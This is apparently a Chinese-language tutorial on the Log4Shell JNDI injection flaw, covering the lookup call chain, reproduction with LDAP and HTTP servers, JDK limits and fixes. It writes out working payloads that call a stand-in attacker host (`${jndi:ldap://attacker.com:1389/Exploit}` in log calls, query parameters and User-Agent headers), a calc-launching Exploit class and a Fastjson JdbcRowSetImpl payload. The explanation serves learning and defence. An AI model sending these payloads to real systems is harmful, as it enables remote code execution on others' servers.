Log4j2 的 JNDI 注入漏洞（Log4Shell）是 2021 年爆发的严重安全漏洞，影响版本为 `2.0-beta9` 到 `2.14.1`。漏洞点在于：**Log4j 会解析日志字符串中的 `${}` 表达式，而 `${jndi:...}` 会直接触发 JNDI 查询。** 如果目标环境允许远程类加载，攻击者就可能把一次普通的日志记录变成远程代码执行。

***

## 一、漏洞本质

> **用户可控内容进入日志 → Log4j 解析 `${jndi:...}` → JNDI 向攻击者服务器查询 → 旧环境下可能远程加载恶意类 → RCE**

Log4Shell 之所以危险，就在于很多程序都会把请求头、参数、用户名、报错信息写进日志，而开发者通常不会把“记录日志”这一步和“发起外部网络请求”联系起来。

### 1.1 `${}` 本来是正常功能

Log4j2 支持在日志中解析 `${}` 表达式，例如：

```java
logger.error("用户名：${java:version}");
```

这里的 `${java:version}` 本来是 Log4j 的查找功能（Lookup），用于在日志里动态展开变量。

真正有风险的是 `jndi` 这种 lookup。

```java
logger.error("${jndi:ldap://attacker.com:1389/Exploit}");
```

只要程序把这段字符串当成日志内容记录下来，Log4j 就会去解析它，并进一步发起 JNDI 查询。

### 1.2 为什么最后会 RCE

Log4j 不会把 `${jndi:...}` 当成普通文本原样输出，而是会：

1. 识别 `${}` 表达式
2. 发现前缀是 `jndi`
3. 调用 `JndiLookup.lookup()`
4. 由 JNDI 去访问攻击者控制的 LDAP / RMI 服务
5. 在旧 JDK 或不安全配置下，继续根据返回结果远程加载类

所以 **Log4j 漏洞的触发点是“解析表达式”**，而 **RCE 能不能最终成立，还取决于 JDK 版本和 JNDI 远程类加载限制**。

## 二、调用链

### 2.1 从日志到远程加载

```text
用户可控输入进入日志
↓
Log4j 解析 ${jndi:ldap://攻击机:1389/Exploit}
↓
调用 JndiLookup.lookup()
↓
JNDI 向 LDAP 服务器发起查询
↓
LDAP 返回一个 Reference
↓
目标 JVM 根据 Reference 去 HTTP 下载恶意类
↓
恶意类被加载并初始化
↓
执行 static {} / 构造逻辑
↓
RCE
```

这里通常会同时出现两个远程服务：

- **LDAP / RMI 服务**：告诉目标“去哪里找类”
- **HTTP 服务**：真正托管恶意 `.class` 文件

### 2.2 漏洞入口代码

`JndiLookup` 的核心逻辑可以简化为：

```java
public class JndiLookup implements StrLookup {

    @Override
    public String lookup(String key) {
        if (key == null) {
            return null;
        }

        try {
            Context ctx = new InitialContext();
            Object obj = ctx.lookup(key);
            return obj != null ? obj.toString() : null;
        } catch (NamingException e) {
            return null;
        }
    }
}
```

这里最关键的点，就是 **它把用户可控的 `key` 直接交给了 `InitialContext.lookup()`。**

如果日志里出现：

```java
logger.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
```

最后执行的就是：

```java
new InitialContext().lookup("ldap://127.0.0.1:1389/Exploit")
```

### 2.3 JNDI、LDAP、HTTP 在这条链里分别做什么

这部分是很多人第一次看 Log4Shell 时最容易混乱的地方。

#### JNDI

JNDI 是 Java 的命名与目录接口。可以把它理解成：**给一个名字，Java 帮你去找对应对象。**

对应到这里，核心动作就是两个：

- `bind()`：把名字和对象绑定起来
- `lookup()`：根据名字把对象找回来

#### LDAP / RMI

LDAP 或 RMI 在这里扮演的是“目录服务器”的角色。

攻击者不是直接把恶意类塞进日志，而是先让目标去问 LDAP：

> “`ldap://attacker:1389/Exploit` 这个名字对应什么对象？”

LDAP 返回的往往不是对象本体，而是一个 **Reference**，里面会告诉目标：

- 类名是什么
- 去哪个 codebase 地址下载

#### HTTP

HTTP 服务负责真正托管恶意类文件，比如 `Exploit.class`。

完整的利用链通常是：

```text
日志里的 ${jndi:ldap://...}
→ 目标访问 LDAP
→ LDAP 返回 Reference
→ 目标再访问 HTTP 下载 Exploit.class
→ JVM 加载类并执行恶意逻辑
```

## 三、怎么复现

### 3.1 要准备什么

![c6e047cf-2b5e-46b6-9202-80486e0a05d8](/photo/java-deserialization/c6e047cf-2b5e-46b6-9202-80486e0a05d8.png)

攻击者通常需要准备三样东西：

1. **LDAP 服务器**：响应 JNDI 查询，返回 Reference
2. **HTTP 服务器**：托管恶意类 `Exploit.class`
3. **攻击载荷**：让目标把 `${jndi:...}` 写进日志

### 3.2 攻击载荷长什么样

最常见的载荷，就是把 `${jndi:...}` 放到任何可能被记录日志的位置：

```http
GET /api/search?q=${jndi:ldap://攻击机IP:1389/Exploit}
User-Agent: ${jndi:ldap://攻击机IP:1389/Exploit}
```

如果目标程序会把 `q` 参数、请求头、异常信息等写入日志，就可能触发漏洞。

### 3.3 这几个组件是怎么配合起来的

#### 第一步：让目标记录恶意字符串

例如程序里有：

```java
logger.error("{}", userInput);
```

如果 `userInput` 可控，攻击者就能传入：

```text
${jndi:ldap://攻击机IP:1389/Exploit}
```

#### 第二步：LDAP 返回“去哪里下载类”

目标执行到 `lookup()` 后，会连接 LDAP 服务。LDAP 服务告诉目标：

- 你要找的类叫 `Exploit`
- 去某个 HTTP 地址下载它

这也是为什么很多复现环境里会用 Marshalsec：它本质上就是帮你快速搭一个“会返回恶意 Reference 的 LDAP / RMI 服务”。

#### 第三步：目标下载并执行恶意类

目标 JVM 再去 HTTP 地址下载 `Exploit.class`。

如果环境允许远程类加载，类被加载并初始化时，静态代码块就会执行，例如：

```java
public class Exploit {
    static {
        Runtime.getRuntime().exec("calc");
    }
}
```

## 四、为什么有的环境能打，有的环境打不动

这一点对理解 Log4Shell 很关键。

### 4.1 Log4j 触发了 JNDI，不代表一定能 RCE

很多资料一上来就写“`${jndi:ldap://...}` 可导致 RCE”，但更准确的说法应该拆成两步：

1. **Log4j 确实会触发 JNDI 查询**
2. **JNDI 查询之后，是否还能远程加载类，要看 JDK 版本和安全配置**

- 触发 lookup ≠ 一定执行恶意类
- 是否能从 LDAP / RMI 继续走到远程类加载，受 JDK 限制

### 4.2 JDK 后来卡住了哪一步

后续 JDK 版本逐步收紧了远程 codebase 加载：

- JDK 6u45、7u21 之后：`java.rmi.server.useCodebaseOnly=true` 默认启用，限制 RMI 远程类加载
- JDK 6u141、7u131、8u121 之后：`com.sun.jndi.rmi.object.trustURLCodebase=false` 默认启用，进一步限制 RMI / CORBA 远程 codebase
- JDK 6u211、7u201、8u191 之后：`com.sun.jndi.ldap.object.trustURLCodebase=false` 默认启用，LDAP 远程 codebase 也被限制

所以很多较新的 JDK 环境里，Log4j 仍可能发起 JNDI 查询，但不一定还能通过 LDAP 远程加载恶意类达成经典 RCE。

## 五、排查

## 六、修复

### 6.1 升级 Log4j

升级到 `2.17.1` 是最直接的方案。

主要思路包括：

1. 默认不再支持通过命名引用的方式继续获取远程对象
2. 仅允许 `log4j2.allowedLdapClasses` 中指定的类
3. 仅允许本地地址或 `log4j2.allowedLdapHosts` 中指定的地址

### 6.2 其他修复思路

1. 禁止用户请求参数中出现攻击关键字
2. 禁止 `lookup` 下载远程文件
3. 禁止 Log4j 所在应用连接外网
4. 禁止 Log4j 使用 lookup
5. 对于 2.10 以下版本，可从 Log4j jar 包中删除相关 lookup 类

### 6.3 升级 JDK

升级 JDK 的作用，不是修复 Log4j 解析 `${jndi:...}` 这件事，而是**切断后续远程类加载链路**。

- 升级 Log4j：修复漏洞入口
- 升级 JDK：削弱或阻断利用效果

### 6.4 修改 Log4j 配置

1. 设置参数：`log4j2.formatMsgNoLookups=true`
2. 修改 JVM 参数：`-Dlog4j2.formatMsgNoLookups=true`
3. 设置系统环境变量：`FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true`
4. 禁止 Log4j2 所在服务器外连

## 七、和 Fastjson 放在一起看

我们之前讲过 Fastjson 的 JNDI 利用链，Log4j 和它最大的相似点是：**最后都走到了 JNDI lookup。**

但两者的触发方式完全不同。

### 7.1 Fastjson 利用链

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://攻击机:1389/Exploit",
  "autoCommit": true
}
```

**触发链**：`JSON.parse()` → `JdbcRowSetImpl.setAutoCommit()` → `connect()` → `InitialContext.lookup()`

### 7.2 Log4j 利用链

```java
logger.error("${jndi:ldap://攻击机:1389/Exploit}");
```

**触发链**：`logger.error()` → 解析 `${}` → `JndiLookup.lookup()` → `InitialContext.lookup()`

### 7.3 核心区别

| 对比项 | Fastjson | Log4j |
| --- | --- | --- |
| 漏洞入口 | 反序列化危险类 | 日志解析 `${}` 表达式 |
| 是否依赖特定 gadget | 是 | 否 |
| 到达 JNDI 的方式 | setter 调用链触发 | lookup 表达式直接触发 |
| 利用门槛 | 需要合适类路径 / gadget | 只要可控输入被写日志即可 |

> **Fastjson 是“危险对象在反序列化过程中触发 JNDI”，Log4j 是“日志字符串本身就能直接触发 JNDI”。**
